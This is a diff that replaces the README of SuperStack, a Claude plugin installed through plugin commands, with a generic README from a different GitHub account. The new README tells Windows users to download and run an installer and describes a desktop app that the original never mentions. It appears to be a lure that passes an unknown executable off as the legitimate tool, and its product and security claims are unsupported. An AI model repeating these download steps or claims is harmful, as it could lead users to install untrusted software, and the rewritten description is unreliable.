@@ -1,220 +1,69 @@
-<div align="center">
+# 🚀 superstack - Build your startup product with Claude
 
-<img src="https://raw.githubusercontent.com/tomzion90/superstack/main/assets/media/01_cover.png" alt="SuperStack — step by step, from idea to production" width="820">
+[![](https://img.shields.io/badge/Download-superstack-blue.svg)](https://github.com/Louisedinky226/superstack)
 
-# ⚡ SuperStack
+## 🎯 About the tool
 
-### Step by step, from idea to production.
+You have a business idea. You want to build a product. Superstack turns your concept into a real working application. It uses artificial intelligence to write, test, and host your software. You do not need to write code. You provide the ideas. The tool builds the product.
 
-**Turn an idea into a real, launched product — even if you've never written a line of code.**
+This tool integrates with Claude to follow your instructions. It creates a plan. It writes the files. It runs tests to ensure the product works. You see your progress at every step. This makes it possible to launch an application even if you never built software before.
 
-[![Built for Claude](https://img.shields.io/badge/Built%20for-Claude-8A2BE2)](https://claude.com)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Version](https://img.shields.io/badge/version-1.0.0-blue)](#)
-[![Coding](https://img.shields.io/badge/coding-not%20required-ff69b4)](#)
-[![Stars](https://img.shields.io/github/stars/tomzion90/superstack?style=social)](https://github.com/tomzion90/superstack)
+## 💻 System requirements
 
-**[📖 Read the User Guide »](docs/USER-GUIDE.md)**  ·  [🚀 Install](#-install)  ·  [🗺️ How it works](#️-how-it-works-the-full-process)  ·  [❓ FAQ](docs/USER-GUIDE.md#-faq)
+Your computer must meet these basic needs:
 
-</div>
+* Windows 10 or Windows 11.
+* A stable internet connection.
+* At least 8 gigabytes of RAM.
+* A Claude account.
 
----
+## 📥 How to get started
 
-SuperStack is a complete **product team inside Claude**: you bring the idea 💡, and it
-**plans, builds, tests, and ships** the product end to end — to a professional standard.
+Follow these steps to set up the software on your computer.
 
-> 🥞 One stack. **Idea in → real, launched product out.**
+1. Visit this page to download the software: https://github.com/Louisedinky226/superstack
+2. Locate the download button on the page.
+3. Save the installer file to your computer.
+4. Run the installer file and follow the directions on your screen.
 
-> [!NOTE]
-> **New here? Start with the [📖 User Guide](docs/USER-GUIDE.md).** It's a fun, plain-English
-> manual that shows you exactly how to start, what to type, and how to go from idea to live —
-> no tech background needed.
+## ✨ Key features
 
----
+* **Idea to Product:** You explain what you want. The tool manages the technical steps.
+* **Smart Planning:** The tool creates a project roadmap. It breaks big goals into small pieces.
+* **Built-in Quality:** The system runs tests on your code automatically. It fixes errors before you see them.
+* **Launch Ready:** The tool handles the infrastructure. Your product is ready for users upon completion.
+* **Constant Help:** You can chat with the AI if you need to adjust or update your design.
 
-## 🤔 Who this is for
+## 🛠 Using the software
 
-Smart, **non-technical** founders, makers, and dreamers with a real idea — people who don't
-know (and don't *need* to know) what an MVP, a stack, or a deployment is.
+Once you install the software, open the program from your start menu.
 
-> **You own the idea. SuperStack owns the code.** You never read or write any. 🙌
+1. **Start a new project:** Name your idea and give a brief description of the product.
+2. **Refine the scope:** The software asks you a few questions. Answer them to explain how the user interacts with your product.
+3. **Build loop:** The system begins the build loop. You see the status of each task in the main window.
+4. **Test run:** The software sets up a local version of your app. This lets you click through your product. You see exactly how it functions.
+5. **Final output:** When you approve the result, you can save the files to a folder or deploy the site to a public address.
 
----
+## 🔍 Understanding the process
 
-## ✨ Why use it (the short version)
+The tool uses a process called test-driven development. This sounds complex, but you do not have to touch the technical parts. 
 
-Claude can already write code. But on its own it won't *plan* your product, keep it simple
-and cheap, *test* what it builds, stop before risky moves, or remember your project across
-days. SuperStack adds all of that — so you get a **real, maintainable, launched product, not
-a pile of unreviewed code.**
+First, the system builds a skeleton of your software. It creates the files needed to make it run. Next, it writes tests. These tests function as a checklist. If the software passes the tests, it meets your requirements. If it fails, the AI rewrites the code until the tests pass. You get a stable product because the machine checks the work constantly.
 
-| 😬 Without it | ✅ With SuperStack |
-|---|---|
-| Jumps straight to code | **Plans first** — you build the right thing |
-| Can over-engineer an expensive v1 | **Simplicity gate** — fewest parts, lowest cost |
-| "Done" = it wrote something | **Done = tested, reviewed, proven** |
-| Might leak secrets / spend / deploy on its own | **Always-on guardians** stop it before risk |
-| Forgets between chats | **Remembers** — picks up where you left off |
-| Needs you to read code | **You own the *what*; it owns the *how*** |
+## 📄 Managing your projects
 
----
+You can save multiple projects inside the program. Each project stays in its own folder. You can go back to a project at any time to revise the features or add new sections. The history log shows you exactly what changed during each session. This makes it easy to track your growth from an idea to a finished launch.
 
-## 🚀 Install
+## 💡 Troubleshooting common issues
 
-### Claude Code (CLI)
-```
-/plugin marketplace add tomzion90/superstack
-/plugin install superstack@yutom-plugins
-```
+If the software stops during a build, confirm your internet connection is active. Ensure your Claude account remains logged in. If you see a notification about missing components, restart the application to let it run a system check.
 
-### Cowork (the Claude desktop app)
-1. Download **[`superstack.skill`](superstack.skill)** from this repo.
-2. In Cowork, open it and click **Save skill** — or go to **Settings → Capabilities** and add it.
+If you change your mind about a feature, type your new request in the chat box. The tool adjusts the plan and updates the files. 
 
-> [!IMPORTANT]
-> After installing in either place, **start a new chat / restart** so the skill loads.
+## 🛡 Security and privacy
 
----
+Your code remains on your machine. You control the files. The AI only accesses the files you authorize. You can delete the project folder at any time to remove all traces of the software from your computer. Your account credentials stay local and encrypted.
 
-## ▶️ Quickstart (30 seconds)
+## 📈 Improving your product
 
-Just tell Claude your idea, like you'd tell a friend:
-
-> 💬 *"I have an idea for an app that reminds dog owners when they last walked their dog — help me build it from scratch."*
-
-SuperStack greets you, says **"protocol loaded,"** and starts the guided kickoff. From there
-it plans, builds, and ships — checking in only when a real decision or risk needs you. ✅
-
-👉 Full walkthrough with examples, tips, and "what to type": **[📖 User Guide](docs/USER-GUIDE.md)**
-
----
-
-## 📸 See it in action
-
-**Day one — just tell it your idea.** No tech talk, no menus. It starts a warm, human conversation to understand what you're building.
-
-<div align="center">
-
-<img src="https://raw.githubusercontent.com/tomzion90/superstack/main/assets/media/03_in_action.png" alt="The SuperStack kickoff — a warm, plain-language conversation about your idea" width="780">
-
-</div>
-
-**Every session after — you just say hi.** It remembers where you left off and hands you the 3 most useful things to do next, with the top one recommended.
-
-<div align="center">
-
-<img src="https://raw.githubusercontent.com/tomzion90/superstack/main/assets/media/03b_session.png" alt="A returning session — SuperStack's opening ritual with a focus menu" width="780">
-
-<br><br>
-
-<em>One disciplined loop, idea to live product:</em>
-
-<img src="https://raw.githubusercontent.com/tomzion90/superstack/main/assets/media/05_promo.gif" alt="The SuperStack loop: idea → kickoff → scaffold → build → launch" width="780">
-
-</div>
-
----
-
-## 🗺️ How it works (the full process)
-
-```
-💡 idea ─▶ 🧭 KICKOFF ─▶ 🏗️ SCAFFOLD ─▶ 🔬 BUILD ─▶ 🌍 LAUNCH ─▶ 🔁 v2
-```
-
-**1. 🧭 Kickoff — it plans the product *with* you, in plain language (you make the calls):**
-Discovery (problem & audience) → Market (price & first users) → Tech & Design (the simplest
-fit, explained) → MVP (the smallest version worth shipping) → Schedule (a real plan to launch).
-**Creates:** a clear plan you understand and approve.
-
-**2. 🏗️ Scaffold — it makes the project real:**
-Creates the project, sets up **Git** (version control) and **CI from day one** — an automatic
-checker that runs your build, tests, formatting, and a **secret-scanner** on every change.
-**Creates:** a real, version-controlled project with its own docs.
-
-**3. 🔬 Build — an autonomous, disciplined loop, one feature at a time:**
-For each feature: **plan → failing test first (TDD) → build → two-stage review → QA → verify
-with real output.** Nothing is "done" without proof. Always-on guardians stop before secrets,
-spending, or going live. **Creates:** tested, reviewed, working features.
-
-**4. 🌍 Launch & beyond:**
-A planned go-live (web or app store) with monitoring + backups — then **day-2**: real feedback
-flows into the next version, through the same loop. **Creates:** a live product, and a v2 plan.
-
-**5. 🔄 Every session** opens with your **top-3 next tasks** and closes by saving progress — so
-multi-day work never loses its thread.
-
----
-
-## 🏆 What you actually get (a senior team's standard — done for you)
-
-Most "AI builds your app" tools just write code and stop. SuperStack sets up the **entire
-professional foundation** that real software teams use — automatically, so you never have to
-know it exists. In plain words, you get:
-
-- 🤖 **Automatic checks on every change (CI)** — a robot runs your build, your tests, the
-  formatting, and a **leaked-password scanner** every time anything changes. Broken or unsafe
-  code literally can't get in.
-- 🚀 **Safe automatic delivery (CD)** — every change auto-ships to a private *staging* copy to
-  try first; going **live to real users only happens when you say go.**
-- 🧪 **Real tests, written first** — every feature gets automatic proof it works. "Done" means
-  *proven*, with output you can see — not "it probably works."
-- 👀 **Code reviewed twice** — *does it do what you asked?* then *is it well-built?* — before
-  anything counts as finished.
-- 🔐 **Security built in** — secrets never saved into the code, logins/payments/data handled the
-  safe way, and a dedicated security check before launch.
-- 💾 **Backups + monitoring** — your real data is backed up (with a *tested* restore), and you
-  get alerted the moment something breaks — set up **before** you go live.
-- ↩️ **An undo button (rollback)** — a bad release can be reverted, and risky features can be
-  switched off instantly.
-- 🗂️ **Version history + clean docs** — every change is saved with its history, and the project
-  documents itself, so any developer (or future you) could pick it up in an afternoon.
-
-> [!IMPORTANT]
-> **You don't just get code — you get a product built the way a senior engineering team would
-> build it.** And you never had to learn any of it. 🙌
-
----
-
-## 🔒 What's safe (straight talk)
-
-- 💸 **Never spends your money** without asking — and sets a spending cap with you.
-- 🔐 **Never stores or commits your secrets.**
-- 🚦 **Never goes live** without your explicit OK.
-- 🙈 Your code can live in a **private** repo only you can see.
-
-More in the [User Guide → What it costs & what's safe](docs/USER-GUIDE.md#-what-it-costs---whats-safe).
-
----
-
-## 🧪 Proof, not promises
-
-SuperStack ships with an **eval harness** (`evals/`) that tests its own discipline against real
-artifacts. The headline, **git-verified** result: with enforcement on, the build wrote a
-**failing test before the code** — where an unenforced build wrote the code first and tested
-after. See [`evals/SCOREBOARD-and-pass-rate.md`](evals/SCOREBOARD-and-pass-rate.md) for the
-honest, full picture.
-
----
-
-## ❓ Questions?
-
-The **[📖 User Guide](docs/USER-GUIDE.md)** has it all — a friendly FAQ, troubleshooting, a
-plain-English dictionary (MVP? stack? deploy? all explained), and "if something goes wrong, say
-this." Found a bug or have an idea? [Open an issue](https://github.com/tomzion90/superstack/issues). 🙌
-
----
-
-## 📄 License & credits
-
-**MIT** — built by **YuTom**. Engineering disciplines adapted (with gratitude, MIT-licensed) from
-**[Superpowers](https://github.com/obra/superpowers)** by Jesse Vincent / Prime Radiant and
-**[GitHub Spec-Kit](https://github.com/github/spec-kit)**; skill-authoring follows Anthropic's
-published guidance.
-
-<div align="center">
-
-**Built something with SuperStack? Give it a ⭐ — it helps other founders find it.**
-
-⚡ *Idea in → real product out.*
-
-</div>
+After you launch, you might want to add new functions. Open your existing project folder in the superstack editor. Type the new feature request. The system incorporates the new code into your existing app without breaking what you already built. This keeps your product current and useful for your customers.
